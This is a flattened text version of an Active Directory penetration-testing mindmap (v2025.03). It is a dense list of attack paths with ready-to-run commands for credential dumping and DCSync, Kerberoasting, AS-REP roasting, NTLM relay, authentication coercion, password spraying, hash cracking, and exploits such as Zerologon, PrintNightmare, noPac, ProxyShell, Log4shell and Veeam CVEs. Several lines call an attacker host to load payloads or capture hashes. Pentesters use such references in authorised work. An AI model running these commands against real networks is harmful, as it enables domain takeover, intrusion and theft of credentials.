- dnscmd.exe /config /serverlevelplugindll

- <\\path\to\dll> # need a dnsadmin user

- GPO

- Generic Write on  GPO

- Abuse GPO

- ACCESS

- ACCESS

- Return the principals that can write

- to the GP-Link attribute on OUs

- Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights

- -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

- SID of principals that can create

- new GPOs in the domain

- Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs  | ? { $_.ObjectAceType

- -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

- Who can control GPOs

- MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p

- Get LAPS passwords

- Read LAPS

- Admin

- Admin

- msf> use post/windows/gather/credentials/enum_laps

- nxc ldap <dc_ip> -d <domain> -u <user>

- -p <password> --module laps

- foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name

- -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}

- ldeep ldap -u <user> -p <password>

- -d <domain> -s ldap://<dc_ip> laps

- Get-LapsADPassword -DomainController <ip_dc> -Credential

- <domain>\<login> | Format-Table -AutoSize

- Who can read LAPS

- MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p

- ReadGMSAPassword

- ldeep ldap -u <user> -p <password> -d

- <domain> -s ldaps://<dc_ip> gmsa

- nxc ldap <ip> -u <user> -p <pass> --gmsa

- gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'

- On OU

- GenericAll / GenericWrite /

- Manage Group Policy Links

- OUned.py --config config.ini

- Write Dacl

- ACE Inheritance

- Grant rights

- On User

- ForceChangePassword

- net user <user> <password> /domain

- User with clear

- text pass

- User with clear

- text pass

- GenericAll / GenericWrite

- login script

- Access

- Access

- add key credentials

- shadow credentials

- shadow credentials

- add SPN (target kerberoasting)

- targetedKerberoast.py -d <domain> -u <user> -p <pass>

- Hash found (TGS)

- Hash found (TGS)

- Change password

- net user <user> <password> /domain

- User with clear

- text pass

- User with clear

- text pass

- On Computer

- GenericAll / GenericWrite

- add Key Credentials

- shadow credentials

- shadow credentials

- msDs-AllowedToActOnBehalf

- RBCD

- RBCD

- On Group

- WriteDACL + WriteOwner

- Grant rights

- Give yourself generic all

- Write Owner

- Grant Ownership

- GenericAll/GenericWrite/Self/Add

- Extended Rights

- Add member to the group

- can change msDS-KeyCredentialLInk

- (Generic Write) + ADCS

- PassTheCertificate

- PassTheCertificate

- Shadow Credentials

- pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD"

- --target "TARGET_SAMNAME" --action "list"

- certipy shadow auto '-u <user>@<domain>' -p

- <password> -account '<target_account>'

- Dcsync

- Crack hash

- Crack hash

- Lateral move

- Lateral move

- Domain Admin

- Domain Admin

- secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'

- mimikatz lsadump::dcsync /domain:<target_domain>

- /user:<target_domain>\administrator

- Administrators, Domain Admins, or Enterprise Admins

- as well as Domain Controller computer accounts

- Know vulnerabilities authenticated

- ProxyNotShell (CVE-2022-41040,

- CVE-2022-41082)

- Admin

- Admin

- poc_aug3.py <host> <username> <password> <command>

- Certifried (CVE-2022-26923)

- PTT

- PTT

- DCSYNC

- DCSYNC

- Domain admin

- Domain admin

- Authentication

- certipy auth -pfx <pfx_file> -username '<dc>$'

- -domain <domain> -dc-ip <dc_ip>

- Request

- certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass'

- -target <ca_fqdn> -ca <ca_name> -template Machine

- Create account

- certipy account create -u <user>@<domain> -p '<password>' -user

- 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'

- PrintNightmare (CVE-2021-1675,

- CVE-2021-34527)

- Admin

- Admin

- printnightmare.py -dll '\\<attacker_ip>\smb\add_user.dll'

- '<user>:<password>@<ip>'

- nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan

- noPac (CVE-2021-42287,

- CVE-2021-42278)

- PTT

- PTT

- DCSYNC

- DCSYNC

- Domain admin

- Domain admin

- noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount

- <machine_account> /mPassword <machine_password> /service cifs /ptt

- nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan

- PrivExchange (CVE-2019-0724,

- CVE-2019-0686)

- HTTP Coerce

- HTTP Coerce

- Admin

- Admin

- Domain admin

- Domain admin

- privexchange.py -ah <attacker_ip> <exchange_host>

- -u <user> -d <domain> -p <password>

- GPP MS14-025

- Domain admin

- Domain admin

- Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>

- findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xml

- msf> use auxiliary/scanner/smb/smb_enum_gpp

- MS14-068

- PTT

- PTT

- Admin

- Admin

- Domain admin

- Domain admin

- findSMB2UPTime.py <ip>

- goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target

- msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum

- ms14-068.py -u <user>@<domain> -p <password>

- -s <user_sid> -d <dc_fqdn>

- Low access (Privilege escalation)

- From Service account

- (SEImpersonate)

- Admin

- Admin

- RemotePotato0

- PrintSpoofer

- GodPotato

- RoguePatato

- Kerberos Relay

- Admin

- Admin

- KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount

- -ComputerName <computer$> -ComputerPassword <password>

- KrbRelayUp.exe spawn -m rbcd -d <domain> -dc

- <dc> -cn <computer_name>-cp <omputer_pass>

- Webdav

- HTTP Coerce

- HTTP Coerce

- open file <file>.searchConnector-ms

- dnstool.py -u <domain>\<user> -p <pass> --record 'attacker'

- --action add --data <ip_attacker> <dc_ip>

- petitpotam.py -u '<user>' -p <pass> -d '<domain>'

- "attacker@80/random.txt" <ip>

- Exploit

- Admin

- Admin

- CVE-2021-36934 (HiveNightmare/SeriousSAM)

- vssadmin list shadows

- SMBGhost CVE-2020-0796

- Search files

- User Account

- User Account

- findstr /si 'pass' *.txt *.xml *.docx *.ini

- Auto Enum

- Admin

- Admin

- .\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"

- winPEASany_ofs.exe

- UAC bypass

- Admin

- Admin

- msdt.exe

- wsreset.exe

- Fodhelper.exe

- Bypass Applocker

- Low access (without

- applocker)

- Low access (without

- applocker)

- MsBuild.exe pshell.xml

- mshta.exe my.hta

- installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe

- files in writables paths

- C:\Windows\Tasks

- C:\Windows\Temp

- Get-Applocker infos

- Get-ChildItem -Path HKLM:\SOFTWARE\Policies

- \Microsoft\Windows\SrpV2\Exe (dll/msi/...)

- Valid Credentials (cleartext creds,

- nt hash, kerberos ticket)

- Exploit

- know vulnerabilities

- know vulnerabilities

- Can Connect to a computer

- Lateral move

- Lateral move

- Intra ID Connect

- Find MSOL

- nxc ldap <dc_ip> -u '<user>' -p '<password>'

- -M get-desc-users |grep -i MSOL

- Coerce

- Coerce kerberos

- SMB Kerberos coerce

- SMB Kerberos coerce

- dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>"

- -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp

- petitpotam.py -u '<user>' -p '<password>' -d

- <domain> '<servername>1UWh...' <target>

- RPC call

- SMB NTLM Coerce

- SMB NTLM Coerce

- coercer.py -d <domain> -u <user> -p <password>

- -t <target> -l <attacker_ip>

- petitpotam.py -d <domain> -u <user> -p

- <password> <listnerer_ip> <target_ip>

- printerbug.py <domain>/<username>:<password>@<printer_ip>

- <listener_ip>

- Webdav

- Launch coerce with <attacker_hostname>@80/x

- as target

- HTTP Coerce

- HTTP Coerce

- add attack computer in dns

- dnstool.py -u <domain>\<user> -p <pass> --record <attack_name>

- --action add --data <ip_attacker> <dc_ip>

- Enable webclient

- .searchConnector-ms

- nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc

- Drop file

- Other files

- ntlm_theft.py -g all -s <your_ip> -f test

- .url

- [InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon

- .scf

- nxc smb <dc_ip> -u '<user>' -p '<password>' -M

- sucffy -o NAME=<filename> SERVER=<attacker_ip>

- .lnk

- nxc smb <dc_ip> -u '<user>' -p '<password>' -M

- slinky -o NAME=<filename> SERVER=<attacker_ip>

- Kerberoasting

- Hash TGS

- Hash TGS

- Rubeus.exe kerberoast

- GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>

- MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502'

- AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u

- Scan Auto

- Import-Module .\adPEAS.ps1; Invoke-adPEAS

- -Domain '<domain>' -Server '<dc_fqdn>'

- PingCastle.exe --healthcheck --server <domain>

- from BH result

- AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>

- Enumerate SCCM

- SCCM Exploitation

- SCCM Exploitation

- SharpSCCM.exe local site-info

- ldeep ldap -u <user> -p <password>

- -d <domain> -s ldap://<dc_ip> sccm

- sccmhunter.py find -u <user> -p <password>

- -d <domain> -dc-ip <dc_ip> -debug

- Enumerate ADCS

- ADCS Exploitation

- ADCS Exploitation

- certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>

- certify.exe find

- Classic Enumeration (users, shares,

- ACL, delegation, ...)

- Enumerate DNS

- New targets (low

- hanging fruit)

- New targets (low

- hanging fruit)

- adidnsdump -u <domain>\\<user> -p "<password>"

- --print-zones <dc_ip>

- Enumerate Ldap

- Username

- Username

- Delegation

- Delegation

- ACL

- ACL

- ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user>

- -p '<password>' -o <output.log> -t all

- ldapdomaindump.py -u <user> -p <password>

- -o <dump_folder> ldap://<dc_ip>:389

- ldeep ldap -u <users> -p '<password>' -d <domain>

- -s ldap://<dc_ip> all <backup_folder>

- Bloodhound CE

- Username

- Username

- Delegation

- Delegation

- ACL

- ACL

- SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output

- --autosplit --threshold 900

- sharphound.exe -c all -d <domain>

- rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>'

- -o <outfile.zip> -z --ldap-filter=(objectGuid=*)

- bloodhound-python -d <domain> -u <user>

- -p <password> -gc <dc> -c all

- Bloodhound Legacy

- Username

- Username

- Delegation

- Delegation

- ACL

- ACL

- sharphound.exe -c all -d <domain>

- import-module sharphound.ps1;invoke-bloodhound

- -collectionmethod all -domain <domain>

- rusthound -d <domain_to_enum> -u '<user>@<domain>'

- -p '<password>' -o <outfile.zip> -z

- bloodhound-python -d <domain> -u <user>

- -p <password> -gc <dc> -c all

- Enumerate SMB share

- Scroll shares

- Scroll shares

- manspider <ip_range> -c passw -e <file extensions>

- -d <domain> -u <user> -p <password>

- nxc smb <ip_range> -u '<user>' -p '<password>'

- --shares [--get-file \\<filename> <filename>]

- nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus

- Find all users

- Username

- Username

- nxc smb <dc_ip> -u '<user>' -p '<password>' --users

- GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>

- Crack hash

- pxe hash ($sccm$aes128$...)

- hashcat -m 19850 -a 0 hash.txt <rockyou.txt>

- Timeroast hash ($sntp-ms$...)

- hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l

- MSCache 2 (very slow)

- ($DCC2$10240...)

- hashcat -m 2100 -a 0 hash.txt <rockyou.txt>

- Kerberos ASREP ($krb5asrep$23...)

- hashcat -m 18200 -a 0 hash.txt <rockyou.txt>

- Kerberos 5 TGS AES128

- ($krb5tgs$17...)

- hashcat -m 19600 -a 0 hash.txt <rockyou.txt>

- Kerberos 5 TGS ($krb5tgs$23$...)

- hashcat -m 13100 -a 0 hash.txt <rockyou.txt>

- john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>

- NTLMv2 (user::N46iSNek...)

- hashcat -m 5600 -a 0 hash.txt <rockyou.txt>

- john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>

- NTLMv1 (user::85D5BC...)

- crack.sh

- hashcat -m 1000 -a 0 hash.txt <rockyou.txt>

- john --format=netntlm hash.txt --wordlist=<rockyou.txt>

- NT (b4b9b02e6f09a9bd760...)

- hashcat -m 1000 -a 0 hash.txt <rockyou.txt>

- john --format=nt hash.txt --wordlist=<rockyou.txt>

- LM (299bd128c1101fd6)

- hashcat -m 3000 -a 0 hash.txt <rockyou.txt>

- john --format=lm hash.txt --wordlist=<rockyou.txt>

- Man In The Middle (Listen and Relay)

- Kerberos relay

- SMB -> LDAP(S)

- same as NTLM relay,

- use krbrelayx.py

- SMB -> SMB

- same as NTLM relay,

- use krbrelayx.py

- To HTTP

- krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template

- DomainController -v '<target_netbios>$' -ip <attacker_ip>

- ESC8

- ESC8

- NTLM relay

- SMB -> NETLOGON

- Zero-Logon (safe method)

- (CVE-202-1472)

- Relay one dc to another

- ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support

- -auth-smb <user>:<password>

- DCSYNC

- DCSYNC

- To MsSQL

- ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks

- MSSQL Socks

- MSSQL Socks

- To HTTP

- Relay to WSUS

- WSUS

- WSUS

- Relay to CA web enrollement

- ESC8

- ESC8

- To SMB

- Relay to SMB (if SMB is not signed)

- ntlmrelayx.py -tf smb_unsigned_ips.txt

- -smb2support [--ipv6] -socks

- SMB Socks

- SMB Socks

- Find SMB not signed targets (default

- if not a Domain controler)

- nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt

- To LDAP(S)

- Relay to LDAP if LDAP signing and LDAPS

- channel binding not enforced (default)

- ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive

- # connect to ldap_shell with nc 127.0.0.1 10111

- LDAP SHELL

- LDAP SHELL

- ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic

- -smb2support --escalate-user <user>

- Domain admin

- Domain admin

- ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support

- --shadow-credentials --shadow-target '<dc_name$>'

- Shadow Credentials

- Shadow Credentials

- ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer

- <computer_name> <computer_password> --delegate-access

- RBCD

- RBCD

- HTTP(S) -> LDAP(S)

- Usually from webdav coerce

- see LDAP(S)

- see LDAP(S)

- SMB -> LDAP(S)

- NTLMv2

- Remove mic (CVE-2019-1040)

- see LDAP(S)

- see LDAP(S)

- NTLMv1

- remove mic (no CVE needed)

- see LDAP(S)

- see LDAP(S)

- MS08-068 self relay

- msf> exploit/windows/smb_smb_relay #

- windows 2000 / windows server 2008

- Listen

- Credentials

- (ldap/http)

- Credentials

- (ldap/http)

- Username

- Username

- Hash NTLMv1

- or NTLMv2

- Hash NTLMv1

- or NTLMv2

- smbclient.py

- responder -l <interface> #use --lm to force downgrade

- Valid user (no password)

- ASREPRoast

- CVE-2022-33679

- Lat move PTT

- Lat move PTT

- CVE-2022-33679.py <domain>/<user> <target>

- Blind Kerberoasting

- Hash found TGS

- Hash found TGS

- GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile

- "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/

- Rubeus.exe keberoast /domain:<domain> /dc:<dcip>

- /nopreauth: <asrep_user> /spns:<users.txt>

- ASREP roasting

- Hash found ASREP

- Hash found ASREP

- Rubeus.exe asreproast /format:hashcat

- nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>

- GetNPUsers.py <domain>/ -usersfile <users.txt>

- -format hashcat -outputfile <output.txt>

- List ASREPRoastable

- Users (need creds)

- MATCH (u:User) WHERE u.dontreqpreauth

- = true AND u.enabled = true RETURN u

- Password Spray

- ⚠️ usuals passwords  (SeasonYear!,

- Company123, ...)

- Clear text Credentials

- Clear text Credentials

- kerbrute passwordspray -d <domain> <users.txt> <password>

- sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>

- nxc smb <dc_ip> -u <users.txt> -p

- <password> --continue-on-success

- ⚠️ user == password

- Clear text Credentials

- Clear text Credentials

- sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to

- lowercase and --upper to uppercase. Add nothing to get only user=pass

- nxc smb <dc_ip> -u <users.txt> -p <passwords.txt>

- --no-bruteforce --continue-on-success

- Get password policy  (you need creds,but you should

- get the policy  first to avoid locking accounts)

- Fined Policy (Privileged)

- ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also

- be runned with a low priv account but less information will be available

- Get-ADFineGainedPasswordPolicy -filter *

- ldapsearch-ad.py --server <dc> -d <domain>

- -u <user> -p <pass> --type pass-pols

- default policy

- ldeep ldap -u <user> -p <password> -d <domain>

- -s ldap://<dc_ip> domain_policy

- Get-ADDefaultDomainPasswordPolicy

- nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol

- Authors

- With the help of

- Daathk (@Daahtk)

- Jenaye (@jenaye_fr)

- Viking (@Vikingfr)

- Evelyha

- Sant0rryu (@Sant0rryu)

- Made by

- Mayfly (@M4yFly)

- Project

- ocd-mindmaps

- Quick Compromise

- Weak websites / services

- nessus

- nuclei

- nuclei -target <ip_range>

- GLPI

- Low access

- Low access

- Admin

- Admin

- CVE_2023_41320

- cve_2023_41320.py -u <user> -p <password> -t <ip>

- CVE-2022-35914

- /vendor/htmlawed/htmlawed/htmLawedTest.php

- Veeam

- Admin

- Admin

- Low access

- Low access

- User Account

- User Account

- CVE-2024-40711 (unserialize

- - Veeam backup)

- CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger

- --targetveeam <veeam_ip>

- CVE-2024-29855 (auth bypass -

- Veeam Recovery Orchestrator)

- CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch>

- --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/

- CVE-2024-29849 (auth bypass - Veeam

- Backup Enterprise Manager)

- CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/

- --callback-server <attacker_ip>:<port>

- CVE-2023-27532 (creds

- - Veeam backup)

- CVE-2023-27532 net.tcp:/<target>:<port>/

- VeeamHax.exe --target <veeam_server>

- Exchange

- Admin

- Admin

- Proxyshell

- proxyshell_rce.py -u https://<exchange> -e administrator@<domain>

- Database

- Low access

- Low access

- Admin

- Admin

- msf> use auxiliary/admin/mssql/mssql_enum_sql_logins

- Log4shell

- Low access

- Low access

- Admin

- Admin

- ${jndi:ldap://<ip>:<port>/o=reference}

- Java Serialiszed port

- Low access

- Low access

- Admin

- Admin

- ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>

- Java RMI

- Low access

- Low access

- Admin

- Admin

- msf> use exploit/multi/misc/java_rmi_server

- Tomcat/Jboss Manager

- Low access

- Low access

- Admin

- Admin

- msf> exploit/multi/http/tomcat_mgr_deploy

- msf> auxiliary/scanner/http/tomcat_enum

- Eternal Blue MS17-010

- Low access

- Low access

- Admin

- Admin

- msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only

- ⚠️ Zerologon (unsafe)

- CVE-2020-1472

- Domain admin

- Domain admin

- cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>

- zerologon-scan '<dc_netbios_name>' '<ip>'

- No Credentials

- TimeRoasting

- timeroast hash

- timeroast hash

- timeroast.py <dc_ip> -o <output_log>

- PXE

- password protected

- PXE Hash

- PXE Hash

- pxethief.py 5 '\xxx\boot.var'

- tftp -i <dp_ip> GET "\xxx\boot.var"

- no password

- Credentials (NAA

- account)

- Credentials (NAA

- account)

- pxethief.py 2 <distribution_point_ip>

- pxethief.py 1

- Coerce

- Coerce SMB

- Coerce SMB

- Unauthenticated PetitPotam

- (CVE-2022-26925)

- petitpotam.py -d <domain> <listener> <target>

- Poisoning

- poisoning HTTP

- poisoning HTTP

- poisoning LDAP

- poisoning LDAP

- poisoning SMB

- poisoning SMB

- ⚠️ ARP Poisoning

- asreqroast

- Pcredz -i <interface> -v

- Hash found ASREQ

- Hash found ASREQ

- bettercap

- ⚠️ DHCPv6 (IPv6 prefered to IPv4)

- bettercap

- mitm6 -d <domain>

- LLMNR / NBTNS / MDNS

- responder -l <interface>

- Bruteforce users

- Username

- Username

- nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm=

- '<domain>',userdb=<user_list_file>" <dc_ip>

- kerbrute userenum -d <domain> <userlist>

- Enumerate Users

- Username

- Username

- net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'

- nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID

- nxc smb <dc_ip> --users

- Enumerate LDAP

- Username

- Username

- ldapsearch -x -H <dc_ip> -s base

- nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>

- Anonymous & Guest access

- on SMB shares

- smbclient -U '%' -L //<ip>

- enum4linux-ng.py -a -u '' -p '' <ip>

- nxc smb <ip_range> -u 'a' -p ''

- nxc smb <ip_range> -u '' -p ''

- Zone transfer

- dig axfr <domain_name> @<name_server>

- Find DC IP

- nmap -p 88 --open <ip_range>

- nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

- nmcli dev show <interface>

- Scan network

- Vulnerable host

- Vulnerable host

- nmap -sU -sC -sV -oA <output> <ip>

- nmap -Pn -sC -sV -p- -oA <output> <ip>

- nmap -Pn -sC -sV -oA <output> <ip>

- nmap -Pn --script smb-vuln* -p139,445 <ip>

- nmap -Pn -sV --top-ports 50 --open <ip>

- nmap -sP -p <ip>

- nxc smb <ip_range>

- Active Directory Mindmap v2025.03